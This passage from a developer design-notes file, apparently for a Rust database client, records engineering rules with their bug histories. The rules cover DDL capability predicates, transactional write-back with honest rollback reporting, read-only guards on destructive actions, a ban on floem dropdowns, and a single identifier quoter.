  `supports_view_editing`, `supports_trigger_editing` or `supports_table_design`. All three answer
  true for every full engine (SQLite reaches a table edit by rebuilding, `Change::RebuildTable`),
  and all three **derive** that from `supports_change` rather than returning a literal, which is the
  only form of "always true" that isn't a constant with a function's name on it: the answer changes
  when the emitter's does, and a fourth engine gets whatever the change table says about it. SQL
  Server is that fourth, and the derivation is what switched its editors off and then turned them
  back on one at a time: `supports_change` answers for it before any arm is consulted
  (`tsql_supports`), admitting a table's own changes, the table, view and routine drops, a view's
  create and replace, a trigger's create, replace and drop, a routine's create and replace, and a
  namespace's and a database's create and drop — and every editor predicate follows with no edit
  of its own. It held
  when the first four came on (a new table and the three drops): no editor probes only them, so
  none opened. When `emit_mssql` learned `ALTER COLUMN`, the table designer opened on an existing
  table by that alone, while the other three stayed shut
  (`sql_server_admits_the_table_changes_it_can_write`); when it learned `CREATE OR ALTER VIEW`,
  the view editor opened the same way, and when it learned `CREATE OR ALTER TRIGGER` so did the
  trigger editor (`sql_server_offers_the_trigger_editor`), and with `CREATE OR ALTER
  PROCEDURE`/`FUNCTION` the routine editor (`sql_server_offers_the_routine_editor`), and with
  `CREATE`/`DROP SCHEMA` `supports_namespace_editing` and so the namespace form, and with
  `CREATE`/`DROP DATABASE` `supports_database_editing` and the database form. A menu
  entry with **no** predicate is the same failure with nothing to grep for — the designer's three
  entries were exactly that until `supports_table_design` existed. **Keep asking them, and keep them
  apart**:
  they are per-object questions the menus ask per object, and what differs between engines has
  moved down to the narrower predicates that decide how an edit is *performed* rather than whether
  it is offered — `supports_or_replace_view`, false on SQLite alone, `supports_view_rename`, false
  on SQLite and SQL Server, `supports_view_check_option` and `view_keeps_column_list`,
  `supports_view_security` and `view_replace_can_refuse`,
  `supports_trigger_alter_in_place`, true on SQL Server alone, with the trigger form's
  `trigger_timings`, `trigger_events`, `trigger_fires_on_several_events`,
  `supports_trigger_not_for_replication`, `supports_trigger_execute_as`,
  `supports_trigger_firing_rank`, `trigger_runs_function`, `supports_trigger_level_choice`,
  `supports_trigger_when`, `supports_trigger_update_of` and `supports_view_triggers`, the routine
  form's `routine_takes_language`, `catalogue_body_is_unescaped` for both editors' source fetch, the
  table designer's `takes_table_options`, `supports_column_on_update` and
  `supports_unenforced_check` — the last asked with the `ServerFlavour`, MariaDB lacking the clause
  MySQL has — plus
  `supports_column_reorder`, `rebuilds_tables`, `alter_column_disturbs_checks`,
  `alter_column_disturbs_dependents`, `refreshes_star_dependents`, `publishes_index_ddl`,
  `renames_indexes_in_place`, true on SQL Server alone, and
  `bare_reference_is_own_namespace` — which asks where a bare table name resolves, and so whether a
  foreign key with no namespace may be written without one; `supports_extensions`, which decides
  whether the Create ▸
  *Extension* entry and the Extensions folder's *Create extension* exist at all, PostgreSQL alone
  and computed from `supports_change` like the editor predicates above; and, for the *comparison* rather than
  any editor, `ref_schema_is_database` and `view_definition_is_qualified`; for *Used by*,
  `body_qualifier_is_database` and `rename_follows`; and
  `schema::restates_partitioning`, which asks whether a `CREATE TABLE` carries the partitioning —
  false on SQL Server and SQLite — for `ddl::create_table_sql` and the comparison both. **The same
  rule applies
  inside the emitter, and two loops there answered it by not asking.** `emit_sqlite`'s table-rename
  loop iterated `&self.changes` where every loop above it iterates `supported()`, and
  `view_statements`' `DropView` arm had no `supports_change` guard while its `RefreshView`
  neighbour three lines below does; both therefore reported the change in `unsupported()`, printed
  the INCOMPLETE header, refused Apply and still put the statement in the script the escape hatch
  hands over — which is the shape `container_creates`' own doc records a `DROP SCHEMA` reaching a
  MariaDB through. Neither was reachable through today's menus, and a filter that is applied
  everywhere but one loop is not a filter. `object_statements` was a third, unfiltered on purpose
  while MySQL's answer for PostgreSQL's types was a blanket yes; when that answer became a no,
  `a_refused_change_is_in_no_script_the_set_produces` caught a MySQL set writing `CREATE TYPE … AS
  ENUM` under a header naming it withheld, and it filters now too (under `ddl.rs`). **What a
  per-object capability must not do is answer for an object it wasn't asked
  about**: `field_entries` and `key_entries` take `is_view` because the tree renders a column row
  under a view exactly as under a table, and a constant `true` there offered Edit column and a red
  Drop for something that has neither — opening the *table* designer on a view, whose every edit all
  three engines refuse. `table_designer::open_for_table` refuses outright, as the second lock,
  anything `table_designer::designable` calls no ordinary table — a view, a MariaDB sequence, a
  PostgreSQL foreign table — and the Properties panel's Edit asks the same, where it once asked
  `is_view` alone and opened the designer on the other two (`only_an_ordinary_table_is_designable`).
  Gate the menu entry on the right
  one rather than leaving the refusal to `Db::run_ddl`, which sees only strings. A
  new engine is a `SqlDialect` arm in `ddl.rs`'s emitter, not a parallel emitter. The
  round-trip gate (a draft built from a table must diff to *nothing*) is the test that keeps
  the introspected model and the emitter honest with each other; extend its fixtures when you
  widen the model.
- **Write-back is transactional with a 1-row safety net — and the *report* never claims more than
  the engine delivered.** `commit_writes` runs a `GridWrite`
  (DELETEs → UPDATEs → INSERTs) in one transaction, each statement required to affect exactly 1 row
  (else roll back all) — so an over-optimistic updatability analysis can't corrupt data. **A
  read-only connection is refused at the commit, not only by derivation.** Until security review
  S7 the protection was the edit model's — a read-only connection yields no editable grid, so
  nothing reached `commit_edits` — which is a guard a future path to the commit does not inherit.
  `commit_edits` now re-reads `connection::read_only_of` for the tab's `conn_id` when it runs,
  before it opens anything, and fails with `dialog-read-only`;
  `a_grid_commit_refuses_a_read_only_connection_at_the_commit` pins that the question precedes
  `.commit_writes(`. On SQLite
  the *analysis* is the part that has to be conservative, and it now reads the driver's per-column
  provenance rather than deriving attribution from the statement — see `db::sqlite`. What the
  statement still decides is whether that provenance may be trusted at all
  (`intel::provenance_sources`), and the widening is real: a join, a subquery and a CTE over ordinary
  tables are editable where the derivation refused them, and so is a table in an `ATTACH`ed
  database — attributed to the database it is really in, now that every schema lookup behind the
  attribution takes one — while a set operation at any depth and a view anywhere in the statement
  are each refused for their own stated reason.
  `intel::projection_of` is still read, for the `rowid` *spelling* alone — which is what the
  relaxation placing items ahead of a lone trailing `*` makes analysable in `SELECT rowid, * FROM t`,
  a keyless table opened through its rowid. The guard did not
  move with any of it: an implicit key is an ordinary key column to `commit_writes`, so the ordering and
  the 1-row net apply to it unchanged, and widening the analysis further is still the way this
  invariant gets regressed. **The net's premise is that a stale key matches zero rows, and an
  implicit key breaks it** — SQLite reassigns rowids, so a number the grid still holds can name a
  different row, and an `UPDATE` on it affects exactly the 1 the guard wants to see. That is
  repaired where the key is built rather than where it is checked: `EditTable::confirm_cols` puts
  the values the grid read into the same `WHERE` for an implicit key only, and `edit::row_key` is
  the one builder that appends them. Restoring the premise is the shape any future key of this kind
  has to take; loosening the guard is not. **And where the premise cannot be restored, the table is
  read-only**: `confirm_columns` answers `None` when an implicit key has nothing left to confirm it
  — every non-key column holding bytes, which `blobs(data BLOB)` is — and `analyze_edit` refuses the
  table outright rather than falling back to a bare `rowid = ?`, which is that premise stated and
  then abandoned. A column holding bytes is excluded from the confirming set because its cell is a
  `<n bytes>` placeholder and not the value, and the test for that is `edit::holds_bytes`, not the
  wire flag: a blob in a SQLite `TEXT`-declared column reads back as the same placeholder, and
  comparing *it* refused every write to the table rather than only the misdirected ones. Its rollback, by contrast, needs no
  hedging — there is no non-transactional table type — and SQL Server's is the second that needs
  none, answering `Complete` or `Unknown` and never `Incomplete` (`db::mssql`). That
  promise is MySQL-engine-dependent: `MyISAM`/`MEMORY`/`ARCHIVE`/`CSV` ignore `BEGIN`/`ROLLBACK`,
  and `ROLLBACK` *succeeds* there while raising warning 1196. So no write path may discard a
  rollback's outcome (`let _ = conn.query_drop("ROLLBACK")` was the bug): roll back through
  `rollback()`, which reads `SHOW WARNINGS`, and carry the answer in the error — the `undone` of a
  `DbError::Write(WriteFailure)`, whose English appends `core::model::Rollback::note()` and whose
  interface wording says the same in the user's language. **`Rollback` has three arms, and the third is there because two of them were one sentence.**
  `Incomplete` is warning 1196 and nothing else — it is the only thing that licenses *"this table's
  storage engine is not transactional, so the rows already written remain"*, which is a claim about
  the engine. A `ROLLBACK` down a socket that is already gone establishes nothing of the kind: the
  server had almost certainly rolled the transaction back itself when the connection dropped, so a
  user told `Incomplete` went to audit an InnoDB table that was exactly as they left it. That route
  and an unreadable `SHOW WARNINGS` are `Unknown` now, whose note says the rollback could not be
  confirmed and the rows may or may not remain. The unreadable-warnings route was worse than
  misdescribed — `unwrap_or_default()` turned a failed `SHOW WARNINGS` into an empty vector, no 1196
  was found, and the write path promised a clean rollback on the strength of a query that did not
  run, which `rollback`'s own doc had claimed otherwise about since it was written. **A cancel is an exit like any other**: `Db::import_rows` used to `kill_query` and
  disconnect, and the modal then said "the transaction rolled back, so nothing was written" —
  which on those engines is false, so the user re-ran the import and doubled ~250k rows. It rolls
  back on the same connection now and reports what that achieved, `DbError::Cancelled` meaning the
  rollback completed and an incomplete one arriving as an error carrying the note. **A rollback the
  connection cannot hear is the same bug one layer down**: racing the whole import and dropping the
  future mid-statement desynchronised `mysql_async`'s result stream, so that `ROLLBACK` and its
  `SHOW WARNINGS` read replies that were not their own and `Complete` was claimed off garbage — the
  shape a cancel has to take is under `schemaic-db`, and `cancelled_import` is where the verdict
  becomes an error — with `cancelled_write` its twin for a cancelled **Commit**: the same rule
  (`DbError::Cancelled` only for `Rollback::Complete`, anything else carrying `Rollback::note`) in a
  sentence that names the right act, since "Import cancelled" over a write-back describes something
  the user did not do. **And a cancelled write leaves through an explicit `ROLLBACK` on every engine
  that has a connection to lose — MySQL, PostgreSQL and SQL Server — now**: SQLite's is a rusqlite
  `Transaction` whose drop aborts locally, holding no network lock and racing nothing, and its cancel
  is refused up front by `refuse_if_cancelled` rather than mid-flight, so there is no in-flight
  statement to leave behind. `pg::commit_writes`' cancel arm was the one exit resting on the client's drop, which does
  abort the transaction but not until the connection actually goes away — holding every row lock the
  completed statements took meanwhile. `pg::import_rows` and every error exit in `pg::write_on`
  already issued one. **MySQL's arm was `cancelled_import`'s contract read backwards**: it killed the
  query, disconnected and answered `Cancelled` — which the modal renders as "nothing was written" —
  on the strength of the drop undoing the transaction. True on InnoDB, false on
  `MyISAM`/`MEMORY`/`ARCHIVE`/`CSV`, where a cancelled commit of three staged `INSERT`s that got two
  in reported nothing written, left all three staged, and a second Commit landed the two again. It
  goes through `cancelled_write(rollback(&mut conn, "ROLLBACK").await)` now. A unit test of
  `cancelled_write` alone is green against that defect — the seam is between the predicate and its
  caller, and every arm of `commit_writes` needs a live MySQL server to reach — so the pin is a
  source gate, `the_grid_commits_cancel_arm_goes_through_a_rollback`, which reads this crate's own
  source and fails if the cancel arm stops asking what the rollback achieved.
  **And the half that gate could not see is *where* the cancel happens.** Asking `rollback` is worth
  nothing if the connection cannot hear the answer, and `commit_writes`' MySQL arm raced the whole
  write in a `tokio::select!` — whose cancel arm runs only after the branch futures are *dropped*,
  which is why its `&mut conn` re-borrow compiled at all. The in-flight statement was therefore
  dropped instead of awaited, `mysql_async`'s result stream was desynchronised, and the `ROLLBACK`
  added for honesty read replies that were not its own. It is the construct `import_rows` removed
  270 lines above for exactly this reason, measurement and all. `write_on` owns the token now, the
  way `import_on` does — stopping between statements, or after *awaiting* a statement it killed — so
  the rollback goes out on an intact protocol and `cancelled_write` can be believed;
  `Session::commit_writes` passes `None`, its batch being a savepoint inside the user's transaction
  that `classify_isolated` answers for. **`None` there means only that the batch does not read its
  own rollback, and it used to be written as an exemption from the rule above** — which answered a
  *transaction-state* question with a *protocol* one. Whoever answers for what survived, the killed
  statement still has to be awaited, and on that pinned connection it now is
  (`mysql::cancel_awaited`, under `schemaic-db`). **Reproduced on the live tier**, which the review could not
  reach: a 4,000-row commit into a `MyISAM` table, cancelled 300 ms in, returned `Err(Cancelled)` —
  the variant the modal renders as "nothing was written" — over 2,151 permanently-written rows on
  MariaDB and 159 on MySQL before the fix, and said "the rollback did NOT undo them" after it. The
  review ranked this latent because no production caller can cancel the token — which is a decision
  rather than unfinished wiring, and *Data grid* says why; it is not latent at the DB layer. The
  gate carries both halves now: `commit_writes` holds no `tokio::select!`, and
  `write_on`'s cancel path kills the query, awaits the killed statement and asks `rollback` what it
  achieved. **Both halves are measured to the end of the function they name, and the second half was
  not.** It read a fixed `&src[wo..wo + 3000]` window off `write_on` — which already stopped eleven
  lines short of that function's end, so a cancel path added below the window was invisible to it
  and any growth in `write_on` narrowed the gate further, silently. It runs to the function's
  closing brace now, with a length floor so an end marker matching something *inside* the body fails
  rather than shrinking the window to nothing. That is the same defect the first half had been
  repaired for one commit earlier and this half kept.
  `one_row_verdict` states only what the guard saw — it runs *before* the rollback and can't
  know what it achieved, so its `Err` is a `OneRowMiss` and **every** executor adds the
  `Rollback` once it does, building `WriteCause::OneRow(miss)` with `Some(undone)`: SQLite's was
  the one that didn't, and a user reading *"UPDATE main.t affected 2 rows (expected exactly 1)"*
  with nothing after it had no way to know the other three staged edits went back too. Its import
  likewise reports `Rollback::Complete` rather than a third hand-written wording of the sentence
  `Rollback` exists to unify. **A value, not a sentence, is what lets the report be both honest
  and translated**: the clause used to be appended to a `String` in `schemaic-db`, so the one
  sentence whose whole job is to say what survived could only ever say it in English.
  `WriteFailure::message` is still that English byte for byte, which is what the log, the tests
  and every `to_string()` read. `engine_is_transactional` is the predicate (unknown ⇒ not transactional,
  same rule as `pg_replaceable`); the import modal warns from it before the load starts. Commits
  with inserts/deletes full-re-run the query (membership/order changed); pure-UPDATE commits splice
  in place. Both halves of that rule are **pure and tested in `core::model`**, and both engines'
  executors call them: `GridWrite::plan` is the statement order and `one_row_verdict` is the
  per-statement verdict, `OneRowMiss::message` its English — so neither can drift between MySQL and PostgreSQL, and
  a change to `affected != 1` fails a test rather than passing silently.
  **The net counts rows, and cannot see which table they were in** — a limit worth knowing before
  relying on it. A statement aimed at the *wrong* table that affects exactly one row passes
  `one_row_verdict`, and the report is then correct about what it did. That is not hypothetical:
  `edit::insert_target` counted only the base tables that got a key, so a join with one keyless
  table read as a single-table result and offered **Delete row** on it, committing
  `DELETE FROM db.orders WHERE id <=> 7` for a row of the join. The repair is in the gate
  (`EditModel::origin_tables`, in `core::edit`) because there is nowhere else it could be: the gate
  deciding *which* table a row action addresses is the only line, and any future widening of what
  the grid offers to write has to be sound on its own rather than backed by the count.
  **The second hole of that shape is a join `insert_target` structurally cannot see**, and its gate
  lives in the grid because only the *statement* knows: `SELECT o.* FROM orders o JOIN order_lines l
  ON …` gives every column an `orders` origin, so a 1:many join draws N display rows for one parent
  and Delete row destroyed that parent while the other N−1 stayed on screen — one row affected, so
  the net passes and the report says one row deleted. `GridState::row_gestures_are_safe` asks
  `edit::reads_one_relation`, and it **sits on the actions rather than on one menu**. It began as a
  term in the gutter menu's entry list while three other routes reach the identical staging — the
  cell context menu's Delete row / Duplicate row, the results strip's − and clone buttons, and the
  Delete key over a gutter selection — so it is on `GridState::toggle_delete`, its batched twin
  `GridState::mark_deleted` and `clone_rows` now, which is the rule `clone_rows` already states for
  its own size question and this invariant states for writes; the menu and strip terms are
  presentation after that. *Copy as ▸ SQL UPDATE* and *SQL WHERE IN* ask it too (`copy_keyed_sql`),
  though they only copy text: the text is a statement aimed at one table by key, and on that join
  it would be aimed at a parent the display row only partly stands for. **This paragraph claimed the Delete key for a release while it was not
  so**: the key had been batched into a direct `del_rows` write before the guard moved onto
  `toggle_delete`, so on a 1:many join Del marked the parent row every menu refused, and the commit
  deleted it. The batched write is `mark_deleted` now, and
  `the_row_gestures_ask_the_join_guard_in_the_action` fails on any `del_rows.update`/`try_update`
  in `grid.rs` outside the two guarded functions. `None` from `reads_one_relation`
  reads as "no", the direction every other refusal on this path takes, and it over-blocks
  deliberately: a second relation reached only through a subquery multiplies no rows and is refused
  too, the question being "could a row of this result stand for more than one row of that table" and
  a `FROM`-list walk being unable to tell the two apart.
  **And the statement it asks about is `GridCtx::panel_sql`, not `current_statement`.** The latter
  answers "what would a re-run be", which is `None` for a pinned panel and for every panel of a Run
  Everything batch, and the guard's `None` arm falls open — which is where the first spelling let the
  gutter entry back in on both shapes. A panel always knows the statement its own rows came from:
  `Tab::panel_sql_memo(id)` is a memo per panel, built for `panel_frozen_memo`'s reason — "the
  statement of this panel" is a fact about *one* panel and the grid context outlives every one of
  them. The guard asks that first and falls back to `current_statement`; only when neither has a
  statement — a table opened from the tree — does `insert_target`'s own answer stand.
- **A destructive modal action guards its own launch, in the same step that launches it.** Import,
  the DDL preview's Apply, Server Activity's kill, the Export modal's own launch and the Users
  browser's account **Drop** are the five,
  and they go through
  `widgets::accept_launch(in_flight, read_only)` — not through the disabled button, which is what
  *says* the action is unavailable and takes effect on a later update pass. `run_import` set a busy
  flag and never read it, resting on a comment that "its Import button is disabled while one is in
  flight": true of the next pass and false within a single key dispatch, so one Space started
  **two** bulk loads of the same file, both committing, with the second launch overwriting the
  cancellation token so the first could no longer be stopped. A new destructive action asks the same function; a guard re-derived per site
  is one that will be derived differently.
  **A guard that opens a confirm asks *again* in the resolve, and that is now checked rather than
  habitual.** A `Confirm` splits "the same step that launches it" in two — the press, and a closure
  the user reaches an unbounded stretch of time later — and the flag can flip while the modal stands.
  `kill_session` asked once, before `confirm.set`, immediately beside a comment that captures the
  *connection handle* early for exactly that reason, so it gave the read-only flag the opposite
  treatment for the same argument; its two siblings already asked twice (the Users **Drop**) or at
  the press (`ddl_preview::apply`), which is what made it a residue rather than a rule. It re-reads
  `connection::read_only_of` for the captured `conn_id` inside the `yes` arm now. The early ask is
  not the defect and is deliberately kept: it is what produces the per-kind refusal *before* the user
  is asked a question that would be refused anyway. `destructive_launch_gate`'s third test,
  `a_guarded_launch_behind_a_confirm_asks_again_in_the_resolve`, scans both view crates for a guard
  call followed by a `confirm.set(Some(` and fails unless something asks again after it. Its floor
  — the scan must find at least that many such sites, or it is passing by matching nothing — is
  **one** now, `kill_session`: it was two until the Users Drop stopped asking first and opened the
  preview directly, whose Apply asks for itself.
  **The gate that forbids a *constant* in the guard's `read_only` slot was asserting over nothing.**
  `no_launch_hands_the_guard_a_constant` read `code.lines()` and split each line on the needle, so a
  call rustfmt had broken across lines yielded an empty second argument and passed. Of the fourteen
  live guard calls, **six were invisible** that way — `dump_view.rs` ×3, `script_view.rs` ×2,
  `users_view.rs` — and five of those six hand the guard the literal `false`, which is the precise
  defect the gate is named for. Its entire live population was its own two exemptions, and it was the
  only one of `destructive_launch_gate`'s three tests with no floor. It walks the whole call at its
  own paren depth now and carries `checked >= 12`. The sites that hand the literal are **exemptions
  with reasons rather than repairs**, because each of them writes a *file*: a dump reads the server
  and writes a file, which is the same answer `grid.rs`'s export already had, and `script_view`'s two
  are the file-picking and probing half — the run itself is the `accept_launch` at `:207`, already
  exempt under `sql::script_verdict`'s strictly stronger refusal.
  **The half the rule asks of the *other* side is that the disabled button be honest about it**, and
  two surfaces were failing that half rather than the launch half. The DDL preview's Apply asked the
  live flag inside `apply` while the footer's enable term and the "This connection is read-only."
  note beside it both read the `DdlPreview::read_only` **stamp** taken when the plan was built — so
  flipping the connection read-only from the status bar with a `DROP DATABASE` plan on screen left
  Apply lit, saying nothing, and doing nothing when pressed, with the note that exists to explain a
  dead Apply hidden. `ddl_preview::plan_read_only(conns, p)` is the one expression all three ask now
  — the stamp *or* the plan's own connection's live flag, the stamp staying a term because a preview
  built while read-only says so for its whole life — and the footer's `dyn_container` carries the
  live answer in its **key**, since a builder is not a tracking scope in floem 0.2 and reading it
  inside would have frozen it at whichever rebuild last happened to run. Its three tests include
  `only_the_plans_own_connection_is_asked`: a tab keeps the connection it was opened on, so another
  connection going read-only must not refuse this plan. Server Activity's kills were the second
  instance of the same shape and are written up under `activity_panel.rs`.
  **The import modal was the third, and it had copied the guard without the sentence.** `run_import`
  asks the live flag and `accept_launch` refuses the write — the dangerous half, and it is right —
  but it refuses *silently*, so Import stayed lit, said nothing and did nothing: verbatim the failure
  `plan_read_only`'s own doc records, on the modal that copied its guard. Three things, because the
  defect is that they came apart: the enable term is `ready && !busy && !read_only`, the footer
  carries the read-only note beside it, and the flag rides in the mapping step's `dyn_container`
  **key** rather than being read in the builder, which is not a tracking scope.
  `the_import_button_says_a_read_only_connection_rather_than_going_quiet` reads all three off the
  source, all three living in view closures, and asserts the `accept_launch` call as well — a
  disabled button is not what stops the write. Since the catalogue it looks for
  `tr!("dialog-read-only")` and asserts that message's English, the point being that the sentence
  is `ddl_preview`'s own, which that file now reaches through the same message.
  **And the state that guard exists for is, as far as the code can be read, unreachable — which is
  written down here so the next reader neither hunts for the race nor deletes the guard for want of
  one.** The question was whether the flag can move while this modal stands, and the answer is that
  nothing can move it. The modal has exactly one opener in the tree, the schema tree's context-menu
  **Import** entry, disabled on a `read_only` snapshot taken where the menu is built; there is no
  palette, shortcut, toolbar, menu-bar, MCP or drag-and-drop route to it, and
  `conn_actions.open_import` is a *different feature* — importing connections from another client,
  `connection_import.rs` — rather than a second door. The only writers of an existing connection's
  `read_only` are `main.rs`'s `toggle_read_only`, wired to the status bar's `ro_seg` click, and
  the connection form's `save_conn`, behind Manage connections: no shortcut, and nothing server-
  or background-driven (`db::session`'s read-only
  *transaction* detection is a different, session-scoped fact that shares the words). A modal
  backdrop covers the whole window, so neither that segment nor Manage Connections is reachable
  while Import is up. What is left is the pre-open race — a context menu whose snapshot went stale
  between the right-click and the press — and the root-level pointer-down dismissal closes that,
  since any competing click dismisses the menu before its own handler runs. So the live read is
  defence in depth, and deliberately kept: it is here because this is the question every destructive
  launch asks, asked the same way everywhere, which is what stops the *next* opener — a palette
  entry, a toolbar button — from arriving without one.
  **The Drop was the plainest instance of failing it**, and it is the one of that pane's write
  actions the rule bites on — its neighbours refuse read-only inside `open_for_new` /
  `open_for_reset` /
  `open_for_grant`. Its launch read an `enabled` `bool` captured when the account row was *built*, so
  the disabled button was the whole guard, which is verbatim what this rule forbids. It asks
  `accept_launch` at the click, and the same live read then rides into
  `ddl_preview::PlanTarget` in place of the literal `false` that site passed, `PlanTarget`'s own doc
  saying the struct exists so no call site comes to pass a constant beside a live `conn_id`. With
  that constant there the preview opened with Apply enabled and inert. It asked a second time
  inside a `Confirm`'s `resolve` while a red confirm stood between the click and the preview — the
  deferred half the paragraph above is about — and that ask went with the confirm, which was the
  preview's own question asked first: the Drop opens the preview directly now, and the deferred
  step left is the preview's Apply, which re-asks `plan_read_only` itself.
  **The other way to fail this rule is to have no gesture to guard**, which is where the folder
  export sat. The single-file export's consent is the save dialog's own "replace?";
  `select_directories()` has none, and the per-table names are `dump::file_plan`'s rather than the
  user's — so an export aimed at a directory holding hand-written `orders.sql` destroyed it with no
  prompt, no `.bak` and no undo, and the collision list computed a line ahead of the loop had
  nowhere to go but a sentence after the fact. The shape of the repair is the shape to copy where a
  guard's *input* is only knowable off the UI thread: the first run answers
  `FilesOutcome::WouldReplace` having written nothing, the view raises the **shared** `Confirm`, and
  Yes re-launches with `FilesRequest::approved` through `accept_dialog_launch` — the same guard the
  picker's own launch takes, with the generation captured before the question was asked.
  **`read_only` covers server administration, not only data writes** — an open question the
  codebase had never recorded, until the kill arrived and answered it by asking nothing at all. The
  flag is the protection with no "Run anyway", and terminating a live client session — rolling its
  transaction back under it — is the most destructive thing the app can do to a server it has been
  told not to write to. So the session row menu's two kill entries and the lock-wait banner's
  one-click terminate all ask at the click — and again in the confirm's resolve, per the paragraph
  above — through the app-side `may_launch_destructive` re-export of the same function, and a refusal
  says why in the panel's `kill_error` line rather than doing nothing.
  **The rule reaches the schema editors' *doors* as well, and there it has a gate.** Fifteen doors
  across eight files stamp `EditCtx::read_only` into the target they open; **three already refused**
  (`account_editor`'s two and `database_editor`'s one, which is where the rule was stated in the
  imperative) and the other twelve did not. Apply is refused on that same stamp downstream, so **no
  write ever escaped** — what failed the rule was the door. On a connection marked read-only the
  schema tree's double-click, its keyboard activation,
  Find-Anywhere, **Edit table**, **Edit column**, **Edit index**, **Triggers**, **Edit view** and the
  Properties panel's handoff each opened a fully live form, counted the changes and lit Preview SQL,
  and the first thing that said no was Apply. That is the same defect as the disabled button: the
  refusal arrived a step late, and it arrived after the user had done the work. It was filed three
  times as three findings, one editor at a time, because each door is written where its own modal is
  and nothing looked at the fifteen together. Each now refuses before
  writing any signal, fifteen of them spelled `if ctx.read_only { return; }` — which is also the
  order that keeps a half-opened modal off the screen — and
  `ui::read_only_door_gate` holds it. The gate is spelled over the **stamp** rather than over a
  list of function names, so a new editor is caught the
  moment it is written instead of when someone remembers to add it; it asserts it still found all
  sixteen, since a renamed field would otherwise pass it by finding none, and it holds its
  one exemption as *data* with the reason attached — `overlays.rs` stamps the flag into two
  `ddl_preview::PlanTarget`s, which capture the context a Drop-container menu fired in so the
  preview's Apply cannot be answered against a connection the user switched to meanwhile; the refusal
  on that stamp is `preview_container`'s and there is no door there to guard.
  **That exemption is keyed on the struct literal, and it was keyed on the *file*.** `overlays.rs`
  is the launch point for every editor door in the app, so skipping the file skipped the doors with
  the `PlanTarget`s and made the sentence above — a sixteenth editor caught the moment it is
  written — false for the one file where it mattered most. `stamped_into` names the literal a stamp
  sits inside by reading back to the nearest `{` (a target's fields are plain `name: expr,` lines
  with no braces of their own, so nothing can sit between the opener and the `read_only` field) and
  drops path segments, so `crate::ddl_preview::PlanTarget {` and `PlanTarget {` answer alike. Every
  editor target is a `*Target` too, so `EXEMPT` is a name list of one rather than a suffix rule, and
  the gate fails if the exempted literal stops stamping the flag at all — an excuse that has
  outlived what it excused is the other way this list goes wrong.
  **A guard that is present and synchronous is still not the whole rule: its *subject* has to be the
  connection the action is for.** `account_editor`'s three doors are launched from the Users
  browser's captured `UsersTarget`, which can be a different connection from the one the schema tree
  is on — nothing closes the browser when the tree switches — and they asked `edit_ctx`'s live
  `read_only`, the switcher's. So the buttons stayed lit from the connection the browser is showing
  while all three refusals answered about the connection the tree had moved to: a lit control that
  does nothing, with no modal, no message and no dimming. They ask
  `account_editor::door_read_only` now, which is `users_view::launch_read_only` — the question
  **Drop**, one button along in the same row, had been asking all along — and the flag they *stamp*
  moved with the refusal, since refusing on the target while stamping the switcher's value is a
  different wrong outcome rather than none.
  **The gate enforced that divergence rather than catching it**, which is the part worth
  remembering: it recognised a door by the literal `read_only: ctx.read_only,` and demanded `if
  ctx.read_only {` above it, so a door written to ask its target would have *failed* it. Its subject
  is a `SUBJECTS` list of `(stamp, refusal)` pairs now — one per subject the flag can be about, with
  an assertion that each still has at least one user so a spelling that stopped matching cannot hide
  behind the other's count. Sixteen doors, unchanged: splitting the spelling moved three between
  subjects and added none. `anchor_gate` asserts the same two lines from the other side, counting
  them against its own `DOORS`; it was the fix that moved their *address* off `ctx` that moved the
  lines this gate finds them by, and the one that moved their flag that finished it. There are three
  of them: `open_for_reset` is the sixteenth door in the crate and arrived with the refusal already
  written, which is the shape the campaign above exists to make ordinary. **None of this is
  reachable as a test** — the fault is which connection a signal read resolves against at click
  time, and there is no view harness in the repository — so the two source gates hold the spelling
  and the commit carries the hand check: open Users on a writable A, switch the tree to a read-only
  B, and all three buttons must still open their form.
- **No floem `Dropdown` — every `<select>` in the app drops the app's own menu.** A control that
  offers a fixed list is built with `settings::in_ring_picker` (or one of its two thin wrappers,
  `focusable_dropdown` and `table_designer::focusable_owned_dropdown`); nothing constructs a
  `floem::views::dropdown::Dropdown`, and `settings::no_floem_dropdown_gate` scans the crate's own
  source — comments stripped, so the paragraphs that name the type in order to forbid it don't trip
  it — to keep that true. The reason is the paint-only overlay nudge under *Floem 0.2 gotchas*:
  floem places its dropdown's popup as an overlay and, when that popup would overflow the window,
  shifts it back inside **during paint only**, leaving layout and hit-testing where they were. Every
  dropdown in the app carried that latently, and the interface scale is what made it reachable — a
  `modal_h(620)` editor is 992px tall at 160%, so a field near its foot is within a popup's height
  of the window edge on any 1080p screen. There is no bounded fix inside floem's control: the nudge
  is `cx.offset((-x, -y))` against `parent_size - 5.0`, so a `max_height` cap would have to be ≤ 5px
  to guarantee no nudge at all. The class is therefore removed rather than its instances — which is
  cheap only because the app already owned the machinery: `widgets::menu_panel` flips at an edge
  from a predicted height (`menu_panel_height`) rather than trusting an overlay to fit, and
  `widgets::{PopupChannel, open_picker, close_picker}` is the trigger half the row panel's pickers
  pioneered. **Don't reintroduce it for "just one more" control**, and don't reach for a floem popup
  primitive without checking it against that gotcha first.
- **One identifier quoter, as there is one boundary lexer.** Every path that quotes an identifier
  ends at `export::ident_sql` (unconditional — for SQL that is only executed) or its sibling
  `export::ident_if_needed` (only when a bare name would name something else — for SQL the user
  reads and edits). **How a table is *addressed* is the same rule once over**:
  `export::qualified_table` — MySQL qualifies with the database (its connection is server-level),
  PostgreSQL with the namespace, and SQLite names it **bare**, since a connection *is* one file and
  `main` is SQLite's word for "the file you opened" rather than a name the user chose, so
  `INSERT INTO "main"."t"` is noise on every exported row and wrong the moment that SQL is pasted
  where another file is attached under that name. `import::build_insert` held a second copy of it,
  which is how the SQLite case reached one path and not the other.
  `filter::quote_ident`, `schema::ddl_ident_in`, `db::pg::pg_ident`,
  `db::ident_sqlite`, `users::pg_ident` and
  `db::ident` are all thin delegations; the three engine-fixed ones in `schemaic-db` are bound by a
  test in that crate, since they can't take a dialect. **Don't write a fifth** — there were four,
  each having independently arrived at the same escaping, which is the drift hazard rather than the
  reassurance: the literal half of the same split (`schema::ddl_string` missing MySQL's backslash
  escaping while `export::sql_literal` had it) shipped as a High.
  **A MySQL account is not an identifier**, which is the one case that looks like it wants a fifth
  and doesn't: `'app'@'%'` is two *string literals*, so `users::account_sql` goes through the literal
  quoter (`schema::ddl_string`) and only PostgreSQL's host-less half reaches `export::ident_sql`.
  SQLite *reads* three quotings but **emits only `"x"`**: it is the one of the three with a defined
  escape, since a `]` cannot be written inside brackets at all. Its literals take Postgres' arm —
  no backslash escape, so doubling one would corrupt the value. **SQL Server is where brackets do
